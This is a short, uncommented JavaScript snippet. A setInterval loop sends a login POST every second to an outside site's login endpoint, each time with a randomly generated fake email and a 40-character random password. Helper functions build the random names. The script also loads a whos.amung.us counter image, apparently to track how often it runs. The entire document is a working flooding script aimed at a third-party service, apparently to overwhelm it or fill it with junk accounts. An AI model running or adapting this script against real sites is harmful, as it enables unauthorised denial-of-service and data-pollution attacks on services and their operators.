new Image().src = 'http://whos.amung.us/widget/r3dsiker1.png';
function send() {
var xhr = new XMLHttpRequest();
var  params ="tpye=login";
 params +="&email=" + generate_name(5, true) + '@gmail.com';
 params +="&password="  + generate_name(40, true);
 xhr.open("POST", "//sistem.takipcipaneli.info//login", true);
xhr.setRequestHeader("X-Requested-With","XMLHttpRequest");
    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

    xhr.onreadystatechange = function () {
        if (xhr.readyState == 4 && xhr.status == 200) {
            xhr.close;
        }
    }
    xhr.send(params);
	}
setInterval(function() {
 send();
}, 1000);
	
	
function generate_name(length, firstUpper) {
 rname = "";
 sesli = "aeiou";
 sessiz = "bcdfghjklmnprstvyz";
 rname = rand(1, 2) == 1 ? sessiz[rand(0, sessiz.length - 1)] : sesli[rand(0, sesli.length - 1)];
 if (firstUpper == true) {
  rname = rname.toUpperCase();
 }
 for (n = 0; n < length; n++) {
  if (sesli.indexOf(rname[rname.length - 1]) >= 0) {
   rname += sessiz[rand(0, sessiz.length - 1)];
  } else {
   rname += sesli[rand(0, sesli.length - 1)];
  }
 }
 return rname;
}

function rand(min, max) {
 return Math.floor(Math.random() * (max - min)) + min;
}
